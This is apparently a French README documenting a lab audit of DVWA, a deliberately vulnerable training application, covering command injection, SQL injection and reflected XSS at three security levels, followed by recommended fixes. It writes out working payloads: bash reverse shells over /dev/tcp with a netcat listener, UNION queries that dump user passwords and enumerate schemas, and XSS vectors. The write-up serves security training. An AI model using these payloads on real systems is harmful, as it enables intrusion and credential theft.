# 🔐 Web Application Vulnerability Audit – DVWA

Ce projet présente un audit de sécurité sur l'application **DVWA (Damn Vulnerable Web Application)**. Il se concentre sur l'exploitation de **trois vulnérabilités critiques** :

- ✅ Command Injection
- ✅ SQL Injection
- ✅ Reflected Cross-Site Scripting (XSS)

Chaque vulnérabilité est exploitée à travers les différents niveaux de sécurité (`Low`, `Medium`, `High`) proposés par DVWA.

---

## ⚙️ 1. Command Injection

### 📖 Description

Une **Command Injection** permet à un attaquant d'injecter des commandes système via des paramètres non sécurisés. Cela peut mener à une exécution arbitraire de code, jusqu'à l'obtention d'un shell distant.

---

### 🔴 Low

```bash
# Terminal d'écoute
nc -lvnp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Page DVWA (champ IP)
127.0.0.1 && bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"

# ✅ Résultat : Shell interactif obtenu via reverse shell
```

### 🟡 Medium

```bash
# Terminal d'écoute
nc -lvnp 4444

# Page DVWA (champ IP)
127.0.0.1 | bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"

# ✅ Résultat : Reverse shell via contournement avec pipe
```

### 🟠 High

```bash
# Terminal d'écoute
nc -lvnp 4444

# Page DVWA (champ IP)
127.0.0.1|whoami

# ❌ Résultat : L'injection est filtrée par la blacklist (|, &, $, etc.)

```

---

## 🧠 2. SQL Injection

### 📖 Description

La **SQL Injection** permet à un attaquant d’exécuter des requêtes SQL arbitraires via une entrée utilisateur non filtrée.

---

### 🔴 Low

```bash

# Bypass d'authentification
' OR 1=1 # 
'
# Dump des utilisateurs
' UNION SELECT user, password FROM users #
'
# Lister les bases de données
' UNION SELECT schema_name, null FROM information_schema.schemata #
'
# Lister les tables de la base en cours
' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() #
'
# Lister les colonnes de la table "users"
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' #
'
# Obtenir la version de la base
' UNION SELECT database(), @@version #

```

### 🟡 Medium

```bash

# Injection directe via champ numérique (pas de quote utilisée)
1 UNION SELECT user, password FROM users #

# ⚠️ mysqli_real_escape_string est utilisé, mais n'empêche pas l'injection ici
# ✅ Résultat : Dump complet de la table users

```

### 🟠 High

```bash

# Lecture de l'ID via $_SESSION['id'], donc injection indirecte

# Exemple d'injection si session modifiable 
1' UNION SELECT user, password FROM users #
'
# ❌ Résultat : Pas exploitable sans contrôle sur la session PHP
# Bypass possible uniquement avec LFI ou session poisoning

```

---

## ⚡ 3. Reflected Cross-Site Scripting (XSS)

### 📖 Description

Le **Reflected XSS** permet d'injecter du JavaScript dans les réponses HTTP, causant une exécution dans le navigateur victime.

---

### 🔴 Low

```bash

<script>alert("hello")</script>

# ✅ Résultat : alerte exécutée directement

```

### 🟡 Medium

```bash

<img src=x onerror=alert("hello")>

# ✅ Résultat : alerte exécutée via handler JS 


```

### 🟠 High

```bash

<img src="x" onerror=alert("Hello")>
<body onload=alert("hello")>

# ✅ Résultat : alerte exécutée via handler JS -->


```

## ✅ Résumé Webshell
Un shell a été obtenu via Command Injection :

✔️ Créer un fichier : echo test > test.txt

✔️ Supprimer un fichier : rm test.txt

✔️ Exécuter des commandes : id, whoami, etc.

## 🔒 Correctifs recommandés
Vulnérabilité	Correction
Command Injection	escapeshellarg(), supprimer shell_exec(), whitelist IP
SQL Injection	Requêtes préparées (PDO / mysqli), intval(), filtrage strict
XSS	htmlspecialchars(), CSP, suppression du reflet direct

## 📁 Contenu du dépôt
README.md ✅


## ✅ Conclusion
Ce projet démontre l’exploitation de 3 failles critiques sur DVWA avec des attaques pratiques, des contournements de protection, et des correctifs robustes. C’est une démonstration complète de la sécurité offensive et défensive d’une application web.